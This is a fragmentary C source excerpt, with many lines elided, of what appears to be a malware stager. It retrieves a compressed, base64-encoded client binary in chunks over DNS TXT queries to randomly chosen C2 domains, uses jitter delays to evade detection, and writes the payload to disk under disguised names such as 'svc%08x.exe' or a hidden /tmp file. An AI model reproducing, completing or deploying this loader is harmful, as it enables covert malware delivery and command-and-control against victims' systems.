...
#endif
// DNS_RESOLVER: If set to non-empty value, use this resolver directly
// Empty string means use system resolver (normal behavior)
#ifndef DNS_RESOLVER
    #define DNS_RESOLVER ""
#endif
#ifndef C2_DOMAINS
...
// CSPRNG helpers - avoid weak rand()/srand()
static int secure_random_bytes(void *buf, size_t len) {
#ifdef _WIN32
    return (int)SystemFunction036(buf, (ULONG)len);
#else
...
static uint32_t secure_rand32(void) {
    uint32_t v = 0;
    if (!secure_random_bytes(&v, sizeof(v))) {
#ifdef _WIN32
        v = (uint32_t)time(NULL) ^ (uint32_t)GetCurrentProcessId();
#else
...
static int secure_rand_range(int max) {
    if (max <= 1) return 0;
    return (int)(secure_rand32() % (uint32_t)max);
}
...
#include <zlib.h>
#ifdef _WIN32
// Windows: use zlib for gzip decompression (linked via -lz from MinGW)
#endif
 ...
 */
static int encode_domain_name(const char *domain, unsigned char *buffer, size_t buffer_size) {
    size_t pos = 0;
    ...
    while (*ptr) {
        if (*ptr == '.') {
            ...
            if (pos + 1 + label_len >= buffer_size) return -1;
...
static int skip_domain_name(const unsigned char *buffer, size_t buffer_len, size_t *offset) {
    ...
    while (pos < buffer_len) {
        ...
        // Compression pointer
        if ((len & 0xC0) == 0xC0) {
            if (pos + 1 >= buffer_len) return -1;
            if (++ptr_jumps > 16) return -1;
            if (!jumped) {
                *offset = pos + 2;
                jumped = 1;
            }
 ...
 * Priority: 1) DNS_RESOLVER if explicitly configured (non-empty)
 *           2) System resolver (/etc/resolv.conf on Linux)
 *           3) Fallback to 8.8.8.8 if unavailable
 *
...
static int get_system_dns(char *dns_server, size_t dns_server_size) {
    // If DNS_RESOLVER is explicitly set (non-empty), use it directly
    if (strlen(DNS_RESOLVER) > 0) {
        strncpy(dns_server, DNS_RESOLVER, dns_server_size - 1);
...
static int dns_query_txt(const char *domain, char *response, size_t response_size) {
    ...
    header->id = htons((uint16_t)(secure_rand32() & 0xFFFF));
    ...
    // Encode domain name
    int name_len = encode_domain_name(domain, query + query_len, sizeof(query) - query_len);
    if (name_len < 0) {
        DEBUG_PRINT("[!] Domain name encoding failed (too long?)\n");
#ifdef _WIN32
        closesocket(sock);
        WSACleanup();
#else
...
static int send_dns_message(const char *message, const char *target_domain, char *response, size_t response_size) {
    ...
    DEBUG_PRINT("[*] DNS query attempt %d/%d to %s\n", attempt + 1, MAX_RETRIES, target_domain);
        ...
        // Use last 5 digits of Unix time — changes every second, saves 5 chars vs full timestamp.
        snprintf(domain, sizeof(domain), "%s.%05lu.%s",
                 split_domain, (unsigned long)time(NULL) % 100000, target_domain);
...
int main(int argc, char *argv[]) {
    ...
    // CSPRNG-based randomness used for jitter, domain selection, and DNS txn IDs
    ...
    char *initial_domain = domain_list[secure_rand_range(domain_count)];
    ...
    for (int i = 0; i < total_chunks; i++) {
        ...
        for (chunk_retry = 0; chunk_retry < MAX_RETRIES && !chunk_success; chunk_retry++) {
            ...
            char *target_domain = domain_list[secure_rand_range(domain_count)];
        ...
        if (i < total_chunks - 1 && (i + 1) % CHUNKS_PER_BURST == 0) {
            ...
            int jitter_delay = MIN_CHUNK_DELAY_MS + secure_rand_range(MAX_CHUNK_DELAY_MS - MIN_CHUNK_DELAY_MS + 1);
    ...
    // Base64 decode
    unsigned char *compressed = malloc(total_base64_size);
    if (!compressed) {
        DEBUG_PRINT("[!] Failed to allocate memory for base64 decode (%zu bytes)\n", total_base64_size);
        free(full_base64);
        goto cleanup;
    }
    ...
    // Write client to disk with unpredictable filename
#ifdef _WIN32
    char client_filename[MAX_PATH];
    snprintf(client_filename, sizeof(client_filename), "svc%08x.exe", secure_rand32());
#else
    char client_filename[256];
    strncpy(client_filename, "/tmp/.sXXXXXX", sizeof(client_filename));
    int mkfd = mkstemp(client_filename);
    if (mkfd >= 0) close(mkfd);
#endif
    ...
    size_t written = fwrite(client_binary, 1, client_size, fp);
    fclose(fp);
    free(client_binary);
    if (written != client_size) {
        DEBUG_PRINT("[!] ERROR: Incomplete write (%zu of %zu bytes)\n", written, client_size);
        goto cleanup;
    }
